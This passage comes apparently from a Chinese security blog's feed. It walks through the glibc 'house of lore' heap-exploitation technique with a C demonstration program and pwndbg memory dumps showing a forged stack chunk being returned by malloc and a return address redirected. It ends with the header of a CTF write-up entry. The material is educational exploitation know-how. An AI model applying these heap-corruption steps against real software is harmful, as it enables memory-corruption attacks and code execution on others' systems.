class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">jackpot</span><span class="params">()</span></span>&#123; <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Nice jump d00d\n&quot;</span>); <span class="built_in">exit</span>(<span class="number">0</span>); &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> * argv[])</span></span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">intptr_t</span>* stack_buffer_1[<span class="number">4</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">  <span class="keyword">intptr_t</span>* stack_buffer_2[<span class="number">3</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;定义了两个数组&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_buffer_1 在 %p\n&quot;</span>, (<span class="keyword">void</span>*)stack_buffer_1);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_buffer_2 在 %p\n&quot;</span>, (<span class="keyword">void</span>*)stack_buffer_2);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">intptr_t</span> *victim = <span class="built_in">malloc</span>(<span class="number">100</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;申请第一块属于 fastbin 的 chunk 在 %p\n&quot;</span>, victim);</span><br><span class="line">  <span class="keyword">intptr_t</span> *victim_chunk = victim<span class="number">-2</span>;<span class="comment">//chunk 开始的位置</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;在栈上伪造一块 fake chunk\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;设置 fd 指针指向 victim chunk，来绕过 small bin 的检查，这样的话就能把堆栈地址放在到 small bin 的列表上\n&quot;</span>);</span><br><span class="line">  stack_buffer_1[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  stack_buffer_1[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  stack_buffer_1[<span class="number">2</span>] = victim_chunk;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;设置 stack_buffer_1 的 bk 指针指向 stack_buffer_2，设置 stack_buffer_2 的 fd 指针指向 stack_buffer_1 来绕过最后一个 malloc 中 small bin corrupted, 返回指向栈上假块的指针&quot;</span>);</span><br><span class="line">  stack_buffer_1[<span class="number">3</span>] = (<span class="keyword">intptr_t</span>*)stack_buffer_2;</span><br><span class="line">  stack_buffer_2[<span class="number">2</span>] = (<span class="keyword">intptr_t</span>*)stack_buffer_1;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">void</span> *p5 = <span class="built_in">malloc</span>(<span class="number">1000</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;另外再分配一块，避免与 top chunk 合并 %p\n&quot;</span>, p5);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Free victim chunk %p, 他会被插入到 fastbin 中\n&quot;</span>, victim);</span><br><span class="line">  <span class="built_in">free</span>((<span class="keyword">void</span>*)victim);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\n此时 victim chunk 的 fd、bk 为零\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;victim-&gt;fd: %p\n&quot;</span>, (<span class="keyword">void</span> *)victim[<span class="number">0</span>]);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;victim-&gt;bk: %p\n\n&quot;</span>, (<span class="keyword">void</span> *)victim[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;这时候去申请一个 chunk，触发 fastbin 的合并使得 victim 进去 unsortedbin 中处理，最终被整理到 small bin 中 %p\n&quot;</span>, victim);</span><br><span class="line">  <span class="keyword">void</span> *p2 = <span class="built_in">malloc</span>(<span class="number">1200</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;现在 victim chunk 的 fd 和 bk 更新为 unsorted bin 的地址\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;victim-&gt;fd: %p\n&quot;</span>, (<span class="keyword">void</span> *)victim[<span class="number">0</span>]);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;victim-&gt;bk: %p\n\n&quot;</span>, (<span class="keyword">void</span> *)victim[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;现在模拟一个可以覆盖 victim 的 bk 指针的漏洞，让他的 bk 指针指向栈上\n&quot;</span>);</span><br><span class="line">  victim[<span class="number">1</span>] = (<span class="keyword">intptr_t</span>)stack_buffer_1;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;然后申请跟第一个 chunk 大小一样的 chunk\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;他应该会返回 victim chunk 并且它的 bk 为修改掉的 victim 的 bk\n&quot;</span>);</span><br><span class="line">  <span class="keyword">void</span> *p3 = <span class="built_in">malloc</span>(<span class="number">100</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;最后 malloc 一次会返回 victim-&gt;bk 指向的那里\n&quot;</span>);</span><br><span class="line">  <span class="keyword">char</span> *p4 = <span class="built_in">malloc</span>(<span class="number">100</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;p4 = malloc(100)\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\n在最后一个 malloc 之后，stack_buffer_2 的 fd 指针已更改 %p\n&quot;</span>,stack_buffer_2[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\np4 在栈上 %p\n&quot;</span>, p4);</span><br><span class="line">  <span class="keyword">intptr_t</span> sc = (<span class="keyword">intptr_t</span>)jackpot;</span><br><span class="line">  <span class="built_in">memcpy</span>((p4+<span class="number">40</span>), ≻, <span class="number">8</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>gcc 编译之后，开始动态调试，将断点下在第 31 行，看一下结果：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">160</span>gx <span class="number">0x603000</span></span><br><span class="line"><span class="number">0x603000</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000071</span> <span class="meta">#malloc(100)</span></span><br><span class="line"><span class="number">0x603010</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x603070</span>:<span class="number">0x0000000000000000</span><span class="number">0x00000000000003f1</span> <span class="meta">#malloc(1000)</span></span><br><span class="line"><span class="number">0x603080</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span> <span class="comment">//avoid merge with top chunk</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x603460</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000020ba1</span> #top_chunk</span><br><span class="line">......</span><br><span class="line"><span class="number">0x6034f0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line">pwndbg&gt; x/<span class="number">16</span>gx &amp;stack_buffer_2</span><br><span class="line"><span class="number">0x7fffffffe510</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span> #stack_buffer_2</span><br><span class="line"><span class="number">0x7fffffffe520</span>:<span class="number">0x00007fffffffe530</span><span class="number">0x0000000000400b6d</span></span><br><span class="line">    #stack_buffer_1</span><br><span class="line">    <span class="meta">#fd</span></span><br><span class="line"><span class="number">0x7fffffffe530</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span> #stack_buffer_1</span><br><span class="line"><span class="number">0x7fffffffe540</span>:<span class="number">0x0000000000603000</span><span class="number">0x00007fffffffe510</span></span><br><span class="line">    <span class="meta">#malloc(100)#stack_buffer_2</span></span><br><span class="line">    <span class="meta">#fd#bk</span></span><br><span class="line"><span class="number">0x7fffffffe550</span>:<span class="number">0x00007fffffffe640</span><span class="number">0x907da57e112e3600</span></span><br><span class="line"><span class="number">0x7fffffffe560</span>:<span class="number">0x0000000000400b20</span><span class="number">0x00007ffff7a2d840</span></span><br><span class="line"><span class="number">0x7fffffffe570</span>:<span class="number">0x0000000000000001</span><span class="number">0x00007fffffffe648</span></span><br><span class="line"><span class="number">0x7fffffffe580</span>:<span class="number">0x00000001f7ffcca0</span><span class="number">0x0000000000400722</span></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>首先我们在栈上申请了两个 stack_buffer（fake chunk），然后将 stack_buffer_2 的 fd 指针修改为&amp;stack_buffer_1，将 stack_buffer_1 的 fd 修改为&amp;malloc(100)，将其 bk 修改为&amp;stack_buffer_2。<br>在 free(victim)之后 chunk 将会加入到 fastbin 中：</p><blockquote><p>victim 指的是 malloc(100)，在英语中指受害者；牺牲品；可数名词</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bin</span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x603000</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x0</span></span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>此时假若我们申请一个比较大的 chunk，将调用 malloc_consolidate 整理 victim 到 smallbin 中：</p><blockquote><p>这时候去申请一个 chunk，触发 fastbin 的合并使得 victim<strong>进去 unsortedbin 中处理</strong>，<strong>最终被整理到 smallbin 中</strong></p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bin</span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x0</span></span><br><span class="line">smallbins</span><br><span class="line"><span class="number">0x70</span> [corrupted]</span><br><span class="line">FD: <span class="number">0x603000</span> —▸ <span class="number">0x7ffff7dd1bd8</span> (main_arena+<span class="number">184</span>) ◂— <span class="number">0x603000</span></span><br><span class="line">BK: <span class="number">0x603000</span> ◂— <span class="number">0x71</span> <span class="comment">/* &#x27;q&#x27; */</span></span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">300</span>gx <span class="number">0x603000</span></span><br><span class="line"><span class="number">0x603000</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000071</span> <span class="meta">#malloc(100)-smallbin</span></span><br><span class="line"><span class="number">0x603010</span>:<span class="number">0x00007ffff7dd1bd8</span><span class="number">0x00007ffff7dd1bd8</span></span><br><span class="line">    #指向main_arena</span><br><span class="line">......</span><br><span class="line"><span class="number">0x603070</span>:<span class="number">0x0000000000000070</span><span class="number">0x00000000000003f0</span> <span class="meta">#malloc(1000)</span></span><br><span class="line"><span class="number">0x603080</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x603460</span>:<span class="number">0x0000000000000000</span><span class="number">0x00000000000004c1</span> <span class="meta">#malloc(1200)</span></span><br><span class="line"><span class="number">0x603470</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x603920</span>:<span class="number">0x0000000000000000</span><span class="number">0x00000000000206e1</span> #top_chunk</span><br><span class="line">......</span><br><span class="line"><span class="number">0x603950</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>假如说现在有个漏洞可以修改 victim 的 bk 指针，让 bk 指向我们伪造的 chunk：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">300</span>gx <span class="number">0x603000</span></span><br><span class="line"><span class="number">0x603000</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000071</span> <span class="meta">#malloc(100)-smallbin</span></span><br><span class="line"><span class="number">0x603010</span>:<span class="number">0x00007ffff7dd1bd8</span><span class="number">0x00007fffffffe530</span></span><br><span class="line">    #指向main_arena   #stack_buffer_1</span><br><span class="line">......</span><br><span class="line"><span class="number">0x603070</span>:<span class="number">0x0000000000000070</span><span class="number">0x00000000000003f0</span> <span class="meta">#malloc(1000)</span></span><br><span class="line"><span class="number">0x603080</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x603460</span>:<span class="number">0x0000000000000000</span><span class="number">0x00000000000004c1</span> <span class="meta">#malloc(1200)</span></span><br><span class="line"><span class="number">0x603470</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x603920</span>:<span class="number">0x0000000000000000</span><span class="number">0x00000000000206e1</span> #top_chunk</span><br><span class="line">......</span><br><span class="line"><span class="number">0x603950</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line">pwndbg&gt; x/<span class="number">16</span>gx <span class="number">0x00007fffffffe510</span></span><br><span class="line"><span class="number">0x7fffffffe510</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span> #stack_buffer_2</span><br><span class="line"><span class="number">0x7fffffffe520</span>:<span class="number">0x00007fffffffe530</span><span class="number">0x0000000000400b6d</span></span><br><span class="line">    #stack_buffer_1</span><br><span class="line">    <span class="meta">#fd</span></span><br><span class="line"><span class="number">0x7fffffffe530</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span> #stack_buffer_1</span><br><span class="line"><span class="number">0x7fffffffe540</span>:<span class="number">0x0000000000603000</span><span class="number">0x00007fffffffe510</span></span><br><span class="line">         <span class="meta">#malloc(100)#stack_buffer_2</span></span><br><span class="line">    <span class="meta">#fd#bk</span></span><br><span class="line"><span class="number">0x7fffffffe550</span>:<span class="number">0x00007fffffffe640</span><span class="number">0x907da57e112e3600</span></span><br><span class="line"><span class="number">0x7fffffffe560</span>:<span class="number">0x0000000000400b20</span><span class="number">0x00007ffff7a2d840</span></span><br><span class="line"><span class="number">0x7fffffffe570</span>:<span class="number">0x0000000000000001</span><span class="number">0x00007fffffffe648</span></span><br><span class="line"><span class="number">0x7fffffffe580</span>:<span class="number">0x00000001f7ffcca0</span><span class="number">0x0000000000400722</span></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>然后申请一个与 victim 大小相同的 chunk，直接来看一下结果：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bin</span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x0</span></span><br><span class="line">smallbins</span><br><span class="line"><span class="number">0x70</span> [corrupted]</span><br><span class="line">FD: <span class="number">0x603000</span> —▸ <span class="number">0x7ffff7dd1bd8</span> (main_arena+<span class="number">184</span>) ◂— <span class="number">0x603000</span></span><br><span class="line">BK: <span class="number">0x7fffffffe530</span> ◂— <span class="number">0x0</span>   <span class="meta">#changed</span></span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line">pwndbg&gt; x/<span class="number">300</span>gx <span class="number">0x603000</span></span><br><span class="line"><span class="number">0x603000</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000071</span> <span class="meta">#malloc(100)</span></span><br><span class="line"><span class="number">0x603010</span>:<span class="number">0x00007ffff7dd1bd8</span><span class="number">0x00007fffffffe530</span></span><br><span class="line">    #指向main_arena   #stack_buffer_1</span><br><span class="line">......</span><br><span class="line"><span class="number">0x603070</span>:<span class="number">0x0000000000000070</span><span class="number">0x00000000000003f0</span> <span class="meta">#malloc(1000)</span></span><br><span class="line"><span class="number">0x603080</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x603460</span>:<span class="number">0x0000000000000000</span><span class="number">0x00000000000004c1</span> <span class="meta">#malloc(1200)</span></span><br><span class="line"><span class="number">0x603470</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x603920</span>:<span class="number">0x0000000000000000</span><span class="number">0x00000000000206e1</span> #top_chunk</span><br><span class="line">......</span><br><span class="line"><span class="number">0x603950</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line">pwndbg&gt; x/<span class="number">16</span>gx stack_buffer_2</span><br><span class="line"><span class="number">0x7fffffffe510</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span> #stack_buffer_2</span><br><span class="line"><span class="number">0x7fffffffe520</span>:<span class="number">0x00007fffffffe530</span><span class="number">0x0000000000400b6d</span></span><br><span class="line">        #stack_buffer_1</span><br><span class="line">    <span class="meta">#fd</span></span><br><span class="line"><span class="number">0x7fffffffe530</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span> #stack_buffer_1</span><br><span class="line"><span class="number">0x7fffffffe540</span>:<span class="number">0x00007ffff7dd1bd8</span><span class="number">0x00007fffffffe510</span> <span class="meta">#changed</span></span><br><span class="line">             <span class="meta">#malloc(100)#stack_buffer_2</span></span><br><span class="line">    <span class="meta">#fd</span></span><br><span class="line"><span class="number">0x7fffffffe550</span>:<span class="number">0x00007fffffffe640</span><span class="number">0x907da57e112e3600</span></span><br><span class="line"><span class="number">0x7fffffffe560</span>:<span class="number">0x0000000000400b20</span><span class="number">0x00007ffff7a2d840</span></span><br><span class="line"><span class="number">0x7fffffffe570</span>:<span class="number">0x0000000000000001</span><span class="number">0x00007fffffffe648</span></span><br><span class="line"><span class="number">0x7fffffffe580</span>:<span class="number">0x00000001f7ffcca0</span><span class="number">0x0000000000400722</span></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>从上面的内存可以看到，在申请了 chunk 之后我们伪造的 stack_buffer_1 的 fd 指针发生了改变，现在指向了 main_arena，同时被释放的 victim（smallbin）现在处于 malloc 状态：</p><blockquote><p>smallbin：FIFO 先入先出</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p p3</span><br><span class="line">$<span class="number">1</span> = (<span class="keyword">void</span> *) <span class="number">0x603010</span></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>当再次申请相同大小的 chunk 时，即可控制 stack_buffer_1：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bin</span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x0</span></span><br><span class="line">smallbins</span><br><span class="line"><span class="number">0x70</span> [corrupted]</span><br><span class="line">FD: <span class="number">0x603000</span> —▸ <span class="number">0x7ffff7dd1bd8</span> (main_arena+<span class="number">184</span>) ◂— <span class="number">0x603000</span></span><br><span class="line">BK: <span class="number">0x7fffffffe510</span> ◂— <span class="number">0x0</span></span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line">pwndbg&gt; x/<span class="number">16</span>gx stack_buffer_2</span><br><span class="line"><span class="number">0x7fffffffe510</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7fffffffe520</span>:<span class="number">0x00007ffff7dd1bd8</span><span class="number">0x0000000000400b6d</span></span><br><span class="line"><span class="number">0x7fffffffe530</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span> <span class="meta">#malloc</span></span><br><span class="line"><span class="number">0x7fffffffe540</span>:<span class="number">0x00007ffff7dd1bd8</span><span class="number">0x00007fffffffe510</span></span><br><span class="line"><span class="number">0x7fffffffe550</span>:<span class="number">0x00007fffffffe640</span><span class="number">0x907da57e112e3600</span></span><br><span class="line"><span class="number">0x7fffffffe560</span>:<span class="number">0x0000000000400b20</span><span class="number">0x00007ffff7a2d840</span></span><br><span class="line"><span class="number">0x7fffffffe570</span>:<span class="number">0x0000000000000001</span><span class="number">0x00007fffffffe648</span></span><br><span class="line"><span class="number">0x7fffffffe580</span>:<span class="number">0x00000001f7ffcca0</span><span class="number">0x0000000000400722</span></span><br><span class="line">pwndbg&gt; p p4</span><br><span class="line">$<span class="number">2</span> = <span class="number">0x7fffffffe540</span> <span class="string">&quot;\330\033\335\367\377\177&quot;</span></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>利用 house of lore 可以分配任意指定位置的 chunk，从而修改任意地址的内存。（任意地址写）</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Linux命令执行-BUUCTF-bjdctf_2020_router</title>
    <link href="https://cyberangel.cn/2021/02/22/Linux%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-BUUCTF-bjdctf_2020_router/"/>
    <id>https://cyberangel.cn/2021/02/22/Linux%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-BUUCTF-bjdctf_2020_router/</id>
    <published>2021-02-22T07:36:45.000Z</published>
    <updated>2021-07-04T09:57:12.976Z</updated>
    
